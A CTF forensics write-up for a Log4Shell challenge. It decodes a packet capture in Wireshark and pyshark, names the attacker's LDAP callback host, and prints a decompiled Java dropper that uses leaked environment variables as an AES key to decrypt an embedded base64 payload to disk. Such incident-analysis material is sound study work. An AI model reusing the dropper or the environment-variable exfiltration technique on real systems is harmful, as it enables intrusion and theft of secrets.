---
icon: fingerprint
---

# Log4Shell

### Challenge Description

Our application is still using vulnerable Log4j and someone just hacked us! Please help to investigate and find out what they did.

[https://drive.google.com/file/d/106IBmMEMLl4FncV2zlxqlewZOqUE5wFq/view?usp=sharing](https://drive.google.com/file/d/106IBmMEMLl4FncV2zlxqlewZOqUE5wFq/view?usp=sharing)

Note: There are two flags in this challenge

Author: farisv

### Flag(s)

Flag 1: `CJ{c4n_y0u_c0ntinu3_unt1l_Flag_2?}`

Flag 2: `CJ{w0w_u_are_4_certified_intrusion_analyst_exp3rt!1!}`&#x20;

***

### Analysis (Flag 1)

We are given a network capture that based on the description, is from a server that is suffering from a Log4Shell attack. When opened on Wireshark, we can see a packet that is sending a Log4Shell payload using HTTP.

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 144039.png" alt=""><figcaption><p>Wireshark view of the network capture</p></figcaption></figure>

Viewing the details, we can see the attacker used the same payloads on different headers. The payload itself will access the LDAP server on `157.230.252.80.md3wwucpwhoieybu17ym4ie0zr5itfp3e.oastify.com/3rq5mp6`.&#x20;

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 144159 (1).png" alt=""><figcaption><p>Detailed view of the payload</p></figcaption></figure>

When we use the `ldap` filter on Wireshark, it will return nothing. But if we filter by the port used by LDAP, we will get some results which means the TCP packets are there but not recognized as an LDAP packet by Wireshark. We can configure Wireshark to always dissect packets on the `1389` port as an LDAP server by going to `Analyze > Decode As` and configuring the setting as shown below.

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 144756.png" alt=""><figcaption><p>Decode As configuration</p></figcaption></figure>

After configuring Wireshark as shown above, all LDAP packets will be parsed correctly.

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 144945.png" alt=""><figcaption><p>LDAP packets shown in Wireshark</p></figcaption></figure>

We can see from the screenshot above that the first three characters of the flag (`CJ{`) is transmitted as the object name of the LDAP request. This is confirmed by looking at the HTTP requests, where some of them is trying to leak the `FLAGPARTX` environment variable where `X` is a number.&#x20;

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 145138 (1).png" alt=""><figcaption><p>HTTP packets exfiltrating the flag</p></figcaption></figure>

### Solution (Flag 1)

To exfiltrate the first flag, we can create a script to get every object name on the network capture and join them together.

{% code title="solve.py" overflow="wrap" %}
```python
import pyshark

f = pyshark.FileCapture("./log4shell.pcap", display_filter="tcp.port == 1389 && ldap.objectName && ip.dst == 157.230.252.80", decode_as={'tcp.port==1389':'ldap'})

for packet in f:
    if "LDAP" in packet:
        print(packet.LDAP.objectName, end="")
```
{% endcode %}

After running the script, we get the first flag. But this flag is not accepted by the platform.

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 145421 (1).png" alt=""><figcaption><p>Result of running the script</p></figcaption></figure>

The reason why is that when the HTTP request is exfiltrating the `FLAGPART33` environment variable, there is no LDAP request happening. This could mean that the value of the `FLAGPART33` environment variable is a reserved character for URLs. And since the 33rd character is between `2` and `}`, we can guess that the 33rd character of the flag is `?`. So the final flag is `CJ{c4n_y0u_c0ntinu3_unt1l_Flag_2?}`.

### Analysis (Flag 2)

To get the second flag, we need to investigate further. When filtering the HTTP packets, we can see that there is a request for a `Dropper.class` file.

<figure><img src="../../.gitbook/assets/Screenshot 2025-01-12 150129.png" alt=""><figcaption><p>Dropper.class request and response</p></figcaption></figure>

After getting the response file and decompiling the Java class, we get the code below.

{% code title="Dropper.java" %}
```java
import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class Dropper {
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/ECB/PKCS5Padding";

    private static String getSecretKey() throws Exception {
        Class var0 = Class.forName("java.lang.System");
        Method var1 = var0.getMethod("getenv", String.class);
        String var2 = "";

        for (int var3 = 1; var3 <= 16; ++var3) {
            var2 = var2 + (String) var1.invoke((Object) null, "FLAGPART" + var3);
        }

        return var2;
    }

    public static void decryptToFile(String var0, String var1) throws Exception {
        String var2 = getSecretKey();
        Class var3 = Class.forName("java.util.Base64");
        Method var4 = var3.getMethod("getDecoder");
        Object var5 = var4.invoke((Object) null);
        Method var6 = var5.getClass().getMethod("decode", String.class);
        byte[] var7 = (byte[]) ((byte[]) var6.invoke(var5, var0));
        Class var8 = Class.forName("javax.crypto.spec.SecretKeySpec");
        Constructor var9 = var8.getConstructor(byte[].class, String.class);
        Object var10 = var9.newInstance(var2.getBytes(), "AES");
        Class var11 = Class.forName("javax.crypto.Cipher");
        Method var12 = var11.getMethod("getInstance", String.class);
        Object var13 = var12.invoke((Object) null, "AES/ECB/PKCS5Padding");
        Method var14 = var11.getMethod("init", Integer.TYPE, Class.forName("java.security.Key"));
        Method var15 = var11.getMethod("doFinal", byte[].class);
        var14.invoke(var13, 2, var10);
        byte[] var16 = (byte[]) ((byte[]) var15.invoke(var13, var7));
        FileOutputStream var17 = new FileOutputStream(var1);
        Throwable var18 = null;

        try {
            var17.write(var16);
        } catch (Throwable var27) {
            var18 = var27;
            throw var27;
        } finally {
            if (var17 != null) {
                if (var18 != null) {
                    try {
                        var17.close();
                    } catch (Throwable var26) {
                        var18.addSuppressed(var26);
                    }
                } else {
                    var17.close();
                }
            }

        }

    }

    static {
        try {
            String var0 = "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